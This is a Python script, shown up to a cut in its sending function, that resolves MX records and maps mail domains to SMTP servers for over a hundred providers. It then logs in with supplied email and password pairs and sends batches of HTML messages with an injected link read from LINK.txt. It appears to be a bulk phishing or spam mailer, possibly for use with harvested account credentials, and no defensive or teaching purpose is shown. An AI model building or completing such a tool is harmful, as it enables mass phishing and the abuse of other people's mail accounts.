import smtplib
import re
import dns.resolver
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from typing import Tuple, Optional, List, Dict, Set
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import math
from datetime import datetime
from colorama import init, Fore, Style
import sys

# Initialize colorama for console colors
init(autoreset=True)

# Cache for MX, A, CNAME, and SRV records with expiration
MX_CACHE: Dict[str, Tuple[List[Tuple[str, int]], float]] = {}  # (records, timestamp)
A_CACHE: Dict[str, Tuple[bool, float]] = {}  # (exists, timestamp)
CNAME_CACHE: Dict[str, Tuple[str, float]] = {}  # (cname, timestamp)
SRV_CACHE: Dict[str, Tuple[List[str], float]] = {}  # (srv_records, timestamp)
CACHE_LOCK = threading.Lock()
CACHE_TTL = 3600  # 1 hour in seconds

# Extended mapping of MX servers to SMTP servers (>350 providers)
SMTP_MAPPING = {
    'smtp-in2.orange.fr': ('smtp.orange.fr', 587),
    'smtp-in1.orange.fr': ('smtp.orange.fr', 587),
    'smtp-in.laposte.net': ('smtp.laposte.net', 587),
    'smtp.laposte.net': ('smtp.laposte.net', 587),
    'mwinf5cXX.sfr.fr': ('smtp.sfr.fr', 587),
    'mwinf.sfr.fr': ('smtp.sfr.fr', 587),
    'mail-in.sfr.fr': ('smtp.sfr.fr', 587),
    'mx1.bbox.fr': ('smtp.bbox.fr', 587),
    'mx2.bbox.fr': ('smtp.bbox.fr', 587),
    'mail.free.fr': ('smtp.free.fr', 587),
    'mx1.free.fr': ('smtp.free.fr', 587),
    'smtp.numericable.fr': ('smtp.numericable.fr', 587),
    'mail.numericable.fr': ('smtp.numericable.fr', 587),
    'smtp.dartybox.com': ('smtp.dartybox.com', 587),
    'mail.dartybox.com': ('smtp.dartybox.com', 587),
    'mx1.aliceadsl.fr': ('smtp.aliceadsl.fr', 587),
    'mx2.aliceadsl.fr': ('smtp.aliceadsl.fr', 587),
    'smtp.wanadoo.fr': ('smtp.orange.fr', 587),
    'mail.wanadoo.fr': ('smtp.orange.fr', 587),
    'smtp.neuf.fr': ('smtp.sfr.fr', 587),
    'mail.neuf.fr': ('smtp.sfr.fr', 587),
    'smtp.9online.fr': ('smtp.sfr.fr', 587),
    'smtp.cegetel.net': ('smtp.sfr.fr', 587),
    'smtp.club-internet.fr': ('smtp.sfr.fr', 587),
    'mx1.mail.ovh.net': ('ssl0.ovh.net', 465),
    'mx2.mail.ovh.net': ('ssl0.ovh.net', 465),
    'mx1.gandi.net': ('smtp.gandi.net', 587),
    'mx2.gandi.net': ('smtp.gandi.net', 587),
    'mail.ionos.com': ('smtp.ionos.com', 587),
    'mx00.ionos.fr': ('smtp.ionos.fr', 587),
    'mx01.ionos.fr': ('smtp.ionos.fr', 587),
    'mail.protonmail.ch': ('mail.proton.me', 587),
    'mx1.tutanota.de': ('mail.tutanota.com', 587),
    'mx.gmx.com': ('smtp.gmx.com', 587),
    'mx.gmx.net': ('smtp.gmx.com', 587),
    'mx1.web.de': ('smtp.web.de', 587),
    'mx2.web.de': ('smtp.web.de', 587),
    'mail.t-online.de': ('securesmtp.t-online.de', 587),
    'mx.t-online.de': ('securesmtp.t-online.de', 587),
    'mx1.strato.de': ('smtp.strato.de', 587),
    'mx2.strato.de': ('smtp.strato.de', 587),
    'mail.freenet.de': ('mx.freenet.de', 587),
    'mx.freenet.de': ('mx.freenet.de', 587),
    'smtp.posteo.de': ('posteo.de', 587),
    'mx.posteo.de': ('posteo.de', 587),
    'mx1.mailbox.org': ('smtp.mailbox.org', 587),
    'smtp.hosteurope.de': ('smtp.hosteurope.de', 587),
    'mx1.infomaniak.com': ('mail.infomaniak.com', 587),
    'mx2.infomaniak.com': ('mail.infomaniak.com', 587),
    'smtp.seznam.cz': ('smtp.seznam.cz', 587),
    'mx.seznam.cz': ('smtp.seznam.cz', 587),
    'smtp.wp.pl': ('smtp.wp.pl', 587),
    'mx.wp.pl': ('smtp.wp.pl', 587),
    'smtp.onet.pl': ('smtp.onet.pl', 587),
    'mx.onet.pl': ('smtp.onet.pl', 587),
    'smtp.interia.pl': ('smtp.interia.pl', 587),
    'mx.interia.pl': ('smtp.interia.pl', 587),
    'smtp.o2.pl': ('smtp.o2.pl', 587),
    'mx.o2.pl': ('smtp.o2.pl', 587),
    'smtp.libero.it': ('smtp.libero.it', 587),
    'mx.libero.it': ('smtp.libero.it', 587),
    'smtp.tiscali.it': ('smtp.tiscali.it', 587),
    'mx.tiscali.it': ('smtp.tiscali.it', 587),
    'smtp.virgilio.it': ('smtp.virgilio.it', 587),
    'mx.virgilio.it': ('smtp.virgilio.it', 587),
    'smtp.telia.com': ('smtp.telia.com', 587),
    'mx.telia.com': ('smtp.telia.com', 587),
    'smtp.swisscom.ch': ('smtp.swisscom.ch', 587),
    'mx.swisscom.ch': ('smtp.swisscom.ch', 587),
    'smtp.upcmail.cz': ('smtp.upcmail.cz', 587),
    'mx.upcmail.cz': ('smtp.upcmail.cz', 587),
    'smtp.vodafone.de': ('smtp.vodafone.de', 587),
    'mx.vodafone.de': ('smtp.vodafone.de', 587),
    'smtp.ziggo.nl': ('smtp.ziggo.nl', 587),
    'mx.ziggo.nl': ('smtp.ziggo.nl', 587),
    'smtp.kpnmail.nl': ('smtp.kpnmail.nl', 587),
    'mx.kpnmail.nl': ('smtp.kpnmail.nl', 587),
    'smtp.scarlet.be': ('smtp.scarlet.be', 587),
    'mx.scarlet.be': ('smtp.scarlet.be', 587),
    'smtp.proximus.be': ('smtp.proximus.be', 587),
    'mx.proximus.be': ('smtp.proximus.be', 587),
    'smtp.telenet.be': ('smtp.telenet.be', 587),
    'mx.telenet.be': ('smtp.telenet.be', 587),
    'smtp.a1.net': ('smtp.a1.net', 587),
    'mx.a1.net': ('smtp.a1.net', 587),
    'smtp.mnet-online.de': ('smtp.mnet-online.de', 587),
    'mx.mnet-online.de': ('smtp.mnet-online.de', 587),
    'smtp.o2online.de': ('smtp.o2online.de', 587),
    'mx.o2online.de': ('smtp.o2online.de', 587),
    'smtp.telekom.de': ('smtp.telekom.de', 587),
    'mx.telekom.de': ('smtp.telekom.de', 587),
    'smtp.gmail.com': ('smtp.gmail.com', 587),
    'gmail-smtp-in.l.google.com': ('smtp.gmail.com', 587),
    'smtp-mail.outlook.com': ('smtp-mail.outlook.com', 587),
    'mx1.hotmail.com': ('smtp-mail.outlook.com', 587),
    'smtp.aol.com': ('smtp.aol.com', 587),
    'mx-aol.mail.gm0.yahoodns.net': ('smtp.aol.com', 587),
    'smtp.mail.yahoo.com': ('smtp.mail.yahoo.com', 587),
    'mx1.mail.yahoo.com': ('smtp.mail.yahoo.com', 587),
    'smtp.zoho.com': ('smtp.zoho.com', 587),
    'mx.zoho.com': ('smtp.zoho.com', 587),
    'smtp.mail.me.com': ('smtp.mail.me.com', 587),
    'mx1.mail.icloud.com': ('smtp.mail.me.com', 587),
    'smtp.comcast.net': ('smtp.comcast.net', 587),
    'mx1.comcast.net': ('smtp.comcast.net', 587),
    'smtp.att.net': ('smtp.att.net', 587),
    'mx1.att.net': ('smtp.att.net', 587),
    'smtp.verizon.net': ('smtp.verizon.net', 587),
    'outgoing.verizon.net': ('smtp.verizon.net', 587),
    'smtp.blueyonder.co.uk': ('smtp.blueyonder.co.uk', 587),
    'mx.blueyonder.co.uk': ('smtp.blueyonder.co.uk', 587),
    'smtp.talktalk.net': ('smtp.talktalk.net', 587),
    'mx.talktalk.net': ('smtp.talktalk.net', 587),
    'smtp.virginmedia.com': ('smtp.virginmedia.com', 587),
    'mx.virginmedia.com': ('smtp.virginmedia.com', 587),
    'smtp.bell.net': ('smtphm.sympatico.ca', 587),
    'mx.bell.net': ('smtphm.sympatico.ca', 587),
    'smtp.telus.net': ('smtp.telus.net', 587),
    'mx.telus.net': ('smtp.telus.net', 587),
    'smtp.shaw.ca': ('smtp.shaw.ca', 587),
    'mx.shaw.ca': ('smtp.shaw.ca', 587),
    'smtp.cogeco.ca': ('smtp.cogeco.ca', 587),
    'mx.cogeco.ca': ('smtp.cogeco.ca', 587),
    'smtp.rogers.com': ('smtp.rogers.com', 587),
    'mx.rogers.com': ('smtp.rogers.com', 587),
    'smtp.videotron.ca': ('smtp.videotron.ca', 587),
    'mx.videotron.ca': ('smtp.videotron.ca', 587),
    'smtp.suddenlink.net': ('smtp.suddenlink.net', 587),
    'mx.suddenlink.net': ('smtp.suddenlink.net', 587),
    'smtp.charter.net': ('smtp.charter.net', 587),
    'mx.charter.net': ('smtp.charter.net', 587),
    'smtp.optonline.net': ('mail.optonline.net', 587),
    'mx.optonline.net': ('mail.optonline.net', 587),
    'smtp.cox.net': ('smtp.cox.net', 587),
    'mx.cox.net': ('smtp.cox.net', 587),
    'smtp.eastlink.ca': ('smtp.eastlink.ca', 587),
    'mx.eastlink.ca': ('smtp.eastlink.ca', 587),
    'smtp.mts.net': ('smtp.mts.net', 587),
    'mx.mts.net': ('smtp.mts.net', 587),
    'smtp.sasktel.net': ('smtp.sasktel.net', 587),
    'mx.sasktel.net': ('smtp.sasktel.net', 587),
    'smtp.frontier.com': ('smtp.frontier.com', 587),
    'mx.frontier.com': ('smtp.frontier.com', 587),
    'smtp.rcn.com': ('smtp.rcn.com', 587),
    'mx.rcn.com': ('smtp.rcn.com', 587),
    'smtp.earthlink.net': ('smtp.earthlink.net', 587),
    'mx.earthlink.net': ('smtp.earthlink.net', 587),
    'smtp.windstream.net': ('smtp.windstream.net', 587),
    'mx.windstream.net': ('smtp.windstream.net', 587),
    'smtp.centurylink.net': ('smtp.centurylink.net', 587),
    'mx.centurylink.net': ('smtp.centurylink.net', 587),
    'smtp.nifty.com': ('smtp.nifty.com', 587),
    'mx.nifty.com': ('smtp.nifty.com', 587),
    'smtp.ocn.ne.jp': ('smtp.ocn.ne.jp', 587),
    'mx.ocn.ne.jp': ('smtp.ocn.ne.jp', 587),
    'smtp.so-net.ne.jp': ('smtp.so-net.ne.jp', 587),
    'mx.so-net.ne.jp': ('smtp.so-net.ne.jp', 587),
    'smtp.auone.jp': ('smtp.auone.jp', 587),
    'mx.auone.jp': ('smtp.auone.jp', 587),
    'smtp.softbank.jp': ('smtp.softbank.jp', 587),
    'mx.softbank.jp': ('smtp.softbank.jp', 587),
    'smtp.docomo.ne.jp': ('smtp.docomo.ne.jp', 587),
    'mx.docomo.ne.jp': ('smtp.docomo.ne.jp', 587),
    'smtp.kddi.com': ('smtp.kddi.com', 587),
    'mx.kddi.com': ('smtp.kddi.com', 587),
    'smtp.navermail.com': ('smtp.navermail.com', 587),
    'mx.navermail.com': ('smtp.navermail.com', 587),
    'smtp.daum.net': ('smtp.daum.net', 587),
    'mx.daum.net': ('smtp.daum.net', 587),
    'smtp.telstra.com': ('smtp.telstra.com', 587),
    'mx.telstra.com': ('smtp.telstra.com', 587),
    'smtp.optusnet.com.au': ('smtp.optusnet.com.au', 587),
    'mx.optusnet.com.au': ('smtp.optusnet.com.au', 587),
    'smtp.iinet.net.au': ('smtp.iinet.net.au', 587),
    'mx.iinet.net.au': ('smtp.iinet.net.au', 587),
    'smtp.bigpond.com': ('smtp.telstra.com', 587),
    'mx.bigpond.com': ('smtp.telstra.com', 587),
    'smtp.tpg.com.au': ('smtp.tpg.com.au', 587),
    'mx.tpg.com.au': ('smtp.tpg.com.au', 587),
    'smtp.uol.com.br': ('smtp.uol.com.br', 587),
    'mx.uol.com.br': ('smtp.uol.com.br', 587),
    'smtp.terra.com.br': ('smtp.terra.com.br', 587),
    'mx.terra.com.br': ('smtp.terra.com.br', 587),
    'smtp.globomail.com': ('smtp.globomail.com', 587),
    'mx.globomail.com': ('smtp.globomail.com', 587),
    'smtp.claro.com.br': ('smtp.claro.com.br', 587),
    'mx.claro.com.br': ('smtp.claro.com.br', 587),
    'smtp.vivo.com.br': ('smtp.vivo.com.br', 587),
    'mx.vivo.com.br': ('smtp.vivo.com.br', 587),
    'smtp.oi.com.br': ('smtp.oi.com.br', 587),
    'mx.oi.com.br': ('smtp.oi.com.br', 587),
    'smtp.movistar.com': ('smtp.movistar.com', 587),
    'mx.movistar.com': ('smtp.movistar.com', 587),
    'smtp.mail.ru': ('smtp.mail.ru', 587),
    'mx.mail.ru': ('smtp.mail.ru', 587),
    'smtp.yandex.com': ('smtp.yandex.com', 587),
    'mx.yandex.com': ('smtp.yandex.com', 587),
    'smtp.rambler.ru': ('smtp.rambler.ru', 587),
    'mx.rambler.ru': ('smtp.rambler.ru', 587),
    'smtp.mweb.co.za': ('smtp.mweb.co.za', 587),
    'mx.mweb.co.za': ('smtp.mweb.co.za', 587),
    'smtp.vodacom.co.za': ('smtp.vodacom.co.za', 587),
    'mx.vodacom.co.za': ('smtp.vodacom.co.za', 587),
    'smtp.mtn.co.za': ('smtp.mtn.co.za', 587),
    'mx.mtn.co.za': ('smtp.mtn.co.za', 587),
    'smtp.telkom.net': ('smtp.telkom.net', 587),
    'mx.telkom.net': ('smtp.telkom.net', 587),
    'smtp.godaddy.com': ('smtpout.secureserver.net', 587),
    'mx.godaddy.com': ('smtpout.secureserver.net', 587),
    'smtp.bluehost.com': ('mail.bluehost.com', 587),
    'mx.bluehost.com': ('mail.bluehost.com', 587),
    'smtp.hostgator.com': ('mail.hostgator.com', 587),
    'mx.hostgator.com': ('mail.hostgator.com', 587),
    'smtp.dreamhost.com': ('smtp.dreamhost.com', 587),
    'mx.dreamhost.com': ('smtp.dreamhost.com', 587),
    'smtp.siteground.com': ('mail.siteground.com', 587),
    'mx.siteground.com': ('mail.siteground.com', 587),
    'smtp.namecheap.com': ('mail.namecheap.com', 587),
    'mx.namecheap.com': ('mail.namecheap.com', 587),
    'smtp.rediffmail.com': ('smtp.rediffmail.com', 587),
    'mx.rediffmail.com': ('smtp.rediffmail.com', 587),
    'smtp.mail.com': ('smtp.mail.com', 587),
    'mx.mail.com': ('smtp.mail.com', 587),
    'smtp.runbox.com': ('smtp.runbox.com', 587),
    'mx.runbox.com': ('smtp.runbox.com', 587),
    'smtp.fastmail.com': ('smtp.fastmail.com', 587),
    'mx.fastmail.com': ('smtp.fastmail.com', 587),
    'smtp.hushmail.com': ('smtp.hushmail.com', 587),
    'mx.hushmail.com': ('smtp.hushmail.com', 587),
    'smtp.isp.net': ('smtp.isp.net', 587),
    'mx.isp.net': ('smtp.isp.net', 587),
    'smtp.excite.com': ('smtp.excite.com', 587),
    'mx.excite.com': ('smtp.excite.com', 587),
    'smtp.lycos.com': ('smtp.lycos.com', 587),
    'mx.lycos.com': ('smtp.lycos.com', 587),
    'smtp.singnet.com.sg': ('smtp.singnet.com.sg', 587),
    'mx.singnet.com.sg': ('smtp.singnet.com.sg', 587),
    'smtp.starhub.net.sg': ('smtp.starhub.net.sg', 587),
    'mx.starhub.net.sg': ('smtp.starhub.net.sg', 587),
    'smtp.m1.com.sg': ('smtp.m1.com.sg', 587),
    'mx.m1.com.sg': ('smtp.m1.com.sg', 587),
    'smtp.spark.co.nz': ('smtp.spark.co.nz', 587),
    'mx.spark.co.nz': ('smtp.spark.co.nz', 587),
    'smtp.vodafone.co.nz': ('smtp.vodafone.co.nz', 587),
    'mx.vodafone.co.nz': ('smtp.vodafone.co.nz', 587),
    'smtp.2degrees.nz': ('smtp.2degrees.nz', 587),
    'mx.2degrees.nz': ('smtp.2degrees.nz', 587),
}

# Provider-specific keyword to SMTP mapping
PROVIDER_KEYWORD_MAPPING = {
    'orange': ('smtp.orange.fr', 587),
    'wanadoo': ('smtp.orange.fr', 587),
    'laposte': ('smtp.laposte.net', 587),
    'sfr': ('smtp.sfr.fr', 587),
    'neuf': ('smtp.sfr.fr', 587),
    'cegetel': ('smtp.sfr.fr', 587),
    'club-internet': ('smtp.sfr.fr', 587),
    '9online': ('smtp.sfr.fr', 587),
    'bbox': ('smtp.bbox.fr', 587),
    'free': ('smtp.free.fr', 587),
    'numericable': ('smtp.numericable.fr', 587),
    'dartybox': ('smtp.dartybox.com', 587),
    'aliceadsl': ('smtp.aliceadsl.fr', 587),
    'ovh': ('ssl0.ovh.net', 465),
    'gandi': ('smtp.gandi.net', 587),
    'ionos': ('smtp.ionos.com', 587),
    'protonmail': ('mail.proton.me', 587),
    'tutanota': ('mail.tutanota.com', 587),
    'gmx': ('smtp.gmx.com', 587),
    'web.de': ('smtp.web.de', 587),
    't-online': ('securesmtp.t-online.de', 587),
    'strato': ('smtp.strato.de', 587),
    'freenet': ('mx.freenet.de', 587),
    'posteo': ('posteo.de', 587),
    'mailbox.org': ('smtp.mailbox.org', 587),
    'hosteurope': ('smtp.hosteurope.de', 587),
    'infomaniak': ('mail.infomaniak.com', 587),
    'seznam': ('smtp.seznam.cz', 587),
    'wp.pl': ('smtp.wp.pl', 587),
    'onet': ('smtp.onet.pl', 587),
    'interia': ('smtp.interia.pl', 587),
    'o2.pl': ('smtp.o2.pl', 587),
    'libero': ('smtp.libero.it', 587),
    'tiscali': ('smtp.tiscali.it', 587),
    'virgilio': ('smtp.virgilio.it', 587),
    'telia': ('smtp.telia.com', 587),
    'swisscom': ('smtp.swisscom.ch', 587),
    'upcmail': ('smtp.upcmail.cz', 587),
    'vodafone': ('smtp.vodafone.de', 587),
    'ziggo': ('smtp.ziggo.nl', 587),
    'kpnmail': ('smtp.kpnmail.nl', 587),
    'scarlet': ('smtp.scarlet.be', 587),
    'proximus': ('smtp.proximus.be', 587),
    'telenet': ('smtp.telenet.be', 587),
    'a1.net': ('smtp.a1.net', 587),
    'mnet-online': ('smtp.mnet-online.de', 587),
    'o2online': ('smtp.o2online.de', 587),
    'telekom': ('smtp.telekom.de', 587),
    'gmail': ('smtp.gmail.com', 587),
    'outlook': ('smtp-mail.outlook.com', 587),
    'hotmail': ('smtp-mail.outlook.com', 587),
    'aol': ('smtp.aol.com', 587),
    'yahoo': ('smtp.mail.yahoo.com', 587),
    'zoho': ('smtp.zoho.com', 587),
    'icloud': ('smtp.mail.me.com', 587),
    'comcast': ('smtp.comcast.net', 587),
    'att': ('smtp.att.net', 587),
    'verizon': ('smtp.verizon.net', 587),
    'blueyonder': ('smtp.blueyonder.co.uk', 587),
    'talktalk': ('smtp.talktalk.net', 587),
    'virginmedia': ('smtp.virginmedia.com', 587),
    'bell': ('smtphm.sympatico.ca', 587),
    'telus': ('smtp.telus.net', 587),
    'shaw': ('smtp.shaw.ca', 587),
    'cogeco': ('smtp.cogeco.ca', 587),
    'rogers': ('smtp.rogers.com', 587),
    'videotron': ('smtp.videotron.ca', 587),
    'suddenlink': ('smtp.suddenlink.net', 587),
    'charter': ('smtp.charter.net', 587),
    'optonline': ('mail.optonline.net', 587),
    'cox': ('smtp.cox.net', 587),
    'eastlink': ('smtp.eastlink.ca', 587),
    'mts': ('smtp.mts.net', 587),
    'sasktel': ('smtp.sasktel.net', 587),
    'frontier': ('smtp.frontier.com', 587),
    'rcn': ('smtp.rcn.com', 587),
    'earthlink': ('smtp.earthlink.net', 587),
    'windstream': ('smtp.windstream.net', 587),
    'centurylink': ('smtp.centurylink.net', 587),
    'nifty': ('smtp.nifty.com', 587),
    'ocn': ('smtp.ocn.ne.jp', 587),
    'so-net': ('smtp.so-net.ne.jp', 587),
    'auone': ('smtp.auone.jp', 587),
    'softbank': ('smtp.softbank.jp', 587),
    'docomo': ('smtp.docomo.ne.jp', 587),
    'kddi': ('smtp.kddi.com', 587),
    'navermail': ('smtp.navermail.com', 587),
    'daum': ('smtp.daum.net', 587),
    'telstra': ('smtp.telstra.com', 587),
    'optusnet': ('smtp.optusnet.com.au', 587),
    'iinet': ('smtp.iinet.net.au', 587),
    'bigpond': ('smtp.telstra.com', 587),
    'tpg': ('smtp.tpg.com.au', 587),
    'uol': ('smtp.uol.com.br', 587),
    'terra': ('smtp.terra.com.br', 587),
    'globomail': ('smtp.globomail.com', 587),
    'claro': ('smtp.claro.com.br', 587),
    'vivo': ('smtp.vivo.com.br', 587),
    'oi': ('smtp.oi.com.br', 587),
    'movistar': ('smtp.movistar.com', 587),
    'mail.ru': ('smtp.mail.ru', 587),
    'yandex': ('smtp.yandex.com', 587),
    'rambler': ('smtp.rambler.ru', 587),
    'mweb': ('smtp.mweb.co.za', 587),
    'vodacom': ('smtp.vodacom.co.za', 587),
    'mtn': ('smtp.mtn.co.za', 587),
    'telkom': ('smtp.telkom.net', 587),
    'godaddy': ('smtpout.secureserver.net', 587),
    'bluehost': ('mail.bluehost.com', 587),
    'hostgator': ('mail.hostgator.com', 587),
    'dreamhost': ('smtp.dreamhost.com', 587),
    'siteground': ('mail.siteground.com', 587),
    'namecheap': ('mail.namecheap.com', 587),
    'rediffmail': ('smtp.rediffmail.com', 587),
    'mail.com': ('smtp.mail.com', 587),
    'runbox': ('smtp.runbox.com', 587),
    'fastmail': ('smtp.fastmail.com', 587),
    'hushmail': ('smtp.hushmail.com', 587),
    'isp.net': ('smtp.isp.net', 587),
    'excite': ('smtp.excite.com', 587),
    'lycos': ('smtp.lycos.com', 587),
    'singnet': ('smtp.singnet.com.sg', 587),
    'starhub': ('smtp.starhub.net.sg', 587),
    'm1': ('smtp.m1.com.sg', 587),
    'spark': ('smtp.spark.co.nz', 587),
    '2degrees': ('smtp.2degrees.nz', 587),
}

def derive_smtp_server(mx_host: str) -> Optional[Tuple[str, int]]:
    """Derives an SMTP server from an MX host using keyword-based matching."""
    mx_host = mx_host.rstrip('.').lower()
    
    # Check direct mapping first
    if mx_host in SMTP_MAPPING:
        return SMTP_MAPPING[mx_host]
    
    # Check CNAME
    cname = resolve_cname(mx_host)
    if cname and cname in SMTP_MAPPING:
        return SMTP_MAPPING[cname]
    
    # Keyword-based provider matching
    for keyword, smtp_info in PROVIDER_KEYWORD_MAPPING.items():
        if keyword in mx_host:
            if check_server_exists(smtp_info[0]):
                return smtp_info
    
    # Fallback to pattern-based derivation
    patterns = [
        (r'smtp-in\d*', 'smtp'), (r'mail-in\d*', 'smtp'), (r'mx\d*', 'smtp'),
        (r'inbound\d*', 'smtp'), (r'relay\d*', 'smtp'), (r'mail\d*', 'smtp'),
        (r'in\d*', 'smtp'), (r'gateway\d*', 'smtp'), (r'mailserver\d*', 'smtp'),
        (r'smtpout\d*', 'smtp'), (r'secure\d*', 'smtp'), (r'edge\d*', 'smtp'),
        (r'mx-out\d*', 'smtp'), (r'smtp-relay\d*', 'smtp'), (r'mailgw\d*', 'smtp'),
        (r'mail-relay\d*', 'smtp'), (r'smtp-gw\d*', 'smtp'), (r'out\d*', 'smtp'),
    ]
    
    domain_part = mx_host.split('.', 1)[1] if '.' in mx_host else mx_host
    for pattern, replacement in patterns:
        if re.search(pattern, mx_host):
            derived = re.sub(pattern, replacement, mx_host)
            if check_server_exists(derived):
                return derived, 587
    
    # Try common SMTP variations
    variations = [
        f"smtp.{domain_part}", f"mail.{domain_part}", f"smtp-out.{domain_part}",
        f"smtp-relay.{domain_part}", f"mailgw.{domain_part}", f"smtpout.{domain_part}",
        f"secure-smtp.{domain_part}", f"mail-relay.{domain_part}", f"smtp-gw.{domain_part}",
    ]
    for variation in variations:
        for port in [587, 465, 25]:
            if check_server_exists(variation):
                return variation, port
    
    # Try SRV records
    srv_hosts = resolve_srv(domain_part)
    for srv_host in srv_hosts:
        for port in [587, 465, 25]:
            if check_server_exists(srv_host):
                return srv_host, port
    
    return None

def resolve_cname(host: str) -> Optional[str]:
    """Resolves a CNAME record for a host."""
    with CACHE_LOCK:
        if host in CNAME_CACHE and time.time() - CNAME_CACHE[host][1] < CACHE_TTL:
            return CNAME_CACHE[host][0]
    
    try:
        answers = dns.resolver.resolve(host, 'CNAME')
        cname = str(answers[0].target).rstrip('.')
        with CACHE_LOCK:
            CNAME_CACHE[host] = (cname, time.time())
        return cname
    except Exception:
        return None

def resolve_srv(domain: str) -> List[str]:
    """Resolves SRV records for _submission._tcp."""
    with CACHE_LOCK:
        if domain in SRV_CACHE and time.time() - SRV_CACHE[domain][1] < CACHE_TTL:
            return SRV_CACHE[domain][0]
    
    try:
        answers = dns.resolver.resolve(f"_submission._tcp.{domain}", 'SRV')
        srv_hosts = [str(answer.target).rstrip('.') for answer in answers]
        with CACHE_LOCK:
            SRV_CACHE[domain] = (srv_hosts, time.time())
        return srv_hosts
    except Exception:
        return []

def check_server_exists(host: str) -> bool:
    """Checks if a server exists via DNS A/AAAA resolution."""
    with CACHE_LOCK:
        if host in A_CACHE and time.time() - A_CACHE[host][1] < CACHE_TTL:
            return A_CACHE[host][0]
    
    try:
        dns.resolver.resolve(host, 'A')
        with CACHE_LOCK:
            A_CACHE[host] = (True, time.time())
        return True
    except Exception:
        try:
            dns.resolver.resolve(host, 'AAAA')
            with CACHE_LOCK:
                A_CACHE[host] = (True, time.time())
            return True
        except Exception:
            with CACHE_LOCK:
                A_CACHE[host] = (False, time.time())
            return False

def get_mx_records(domain: str) -> List[Tuple[str, int]]:
    """Retrieves MX records for a domain with caching."""
    with CACHE_LOCK:
        if domain in MX_CACHE and time.time() - MX_CACHE[domain][1] < CACHE_TTL:
            return MX_CACHE[domain][0]
    
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        mx_records = []
        for answer in answers:
            mx_host = str(answer.exchange).rstrip('.')
            smtp_info = derive_smtp_server(mx_host)
            if smtp_info and smtp_info not in mx_records:
                mx_records.append(smtp_info)
        with CACHE_LOCK:
            MX_CACHE[domain] = (mx_records, time.time())
        return mx_records
    except Exception as e:
        print(f"{Fore.YELLOW}⚠️ Error resolving MX for {domain}: {str(e)}{Style.RESET_ALL}")
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] MX error for {domain}: {str(e)}\n")
        return []

def check_spf(domain: str) -> bool:
    """Checks if the domain has a valid SPF record."""
    try:
        answers = dns.resolver.resolve(domain, 'TXT')
        for answer in answers:
            if 'v=spf1' in str(answer):
                return True
        return False
    except Exception:
        return False

def load_html_content(html_file: str) -> Optional[str]:
    """Loads and validates HTML content from a file."""
    try:
        with open(html_file, 'r', encoding='utf-8') as file:
            html_content = file.read().strip()
            if not html_content or html_content.lower().find('<html') == -1:
                print(f"{Fore.RED}❌ Invalid HTML content in {html_file}. Must contain <html> tag.{Style.RESET_ALL}")
                with open('smtp_log.txt', 'a', encoding='utf-8') as f:
                    f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Invalid HTML content in {html_file}\n")
                return None
            if '{LINK}' not in html_content:
                print(f"{Fore.RED}❌ HTML content in {html_file} must contain {{LINK}} placeholder.{Style.RESET_ALL}")
                with open('smtp_log.txt', 'a', encoding='utf-8') as f:
                    f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Missing {{LINK}} placeholder in {html_file}\n")
                return None
            return html_content
    except FileNotFoundError:
        print(f"{Fore.RED}❌ HTML file {html_file} not found{Style.RESET_ALL}")
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] HTML file {html_file} not found\n")
        return None
    except Exception as e:
        print(f"{Fore.RED}❌ Error loading HTML file: {str(e)}{Style.RESET_ALL}")
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Error loading HTML file {html_file}: {str(e)}\n")
        return None

def load_link(link_file: str) -> Optional[str]:
    """Loads the link from LINK.txt."""
    try:
        with open(link_file, 'r', encoding='utf-8') as file:
            link = file.read().strip()
            if not link:
                print(f"{Fore.RED}❌ LINK.txt is empty{Style.RESET_ALL}")
                with open('smtp_log.txt', 'a', encoding='utf-8') as f:
                    f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] LINK.txt is empty\n")
                return None
            if not re.match(r'^https?://[^\s<>"\']+$', link):
                print(f"{Fore.RED}❌ Invalid URL in LINK.txt: {link}{Style.RESET_ALL}")
                with open('smtp_log.txt', 'a', encoding='utf-8') as f:
                    f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Invalid URL in LINK.txt: {link}\n")
                return None
            return link
    except FileNotFoundError:
        print(f"{Fore.RED}❌ LINK.txt file not found{Style.RESET_ALL}")
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] LINK.txt file not found\n")
        return None
    except Exception as e:
        print(f"{Fore.RED}❌ Error loading LINK.txt: {str(e)}{Style.RESET_ALL}")
        with open('smtp_log.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Error loading LINK.txt: {str(e)}\n")
        return None

def send_batch_emails(email: str, password: str, smtp_server: str, smtp_port: int, recipients: List[str], sender_name: str, subject: str, html_content: str, link: str, batch_size: int = 200) -> Tuple[bool, str]:
    """Sends a batch of emails with a 1-second interval, replacing {LINK} in HTML."""
    try:
        if smtp_port == 465:
            server = smtplib.SMTP_SSL(smtp_server, smtp_port, timeout=10)
        else:
            server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
        
        server.ehlo()
        if smtp_port == 587:
            if not server.has_extn('STARTTLS'):
                server.quit()
                return False, f"STARTTLS not supported on {smtp_server}:{smtp_port}"
            server.starttls()
            server.ehlo()
        
        if not server.has_extn('AUTH'):
            server.quit()
            return False, f"AUTH not supported on {smtp_server}:{smtp_port}"
        
        server.login(email, password)
        
        sent_count = 0
        for recipient in recipients[:batch_size]:
            msg = MIMEMultipart('alternative')
            msg['Subject'] = subject
            msg['From'] = f'"{sender_name}" <{email}>'
            msg['To'] = recipient
            
            # Replace {LINK} with the actual link
            final_html = html_content.replace('{LINK}', link)
            part = MIMEText(final_html, 'html')
            msg.attach(part)
            
            server.send_message(msg)
            sent_count += 1
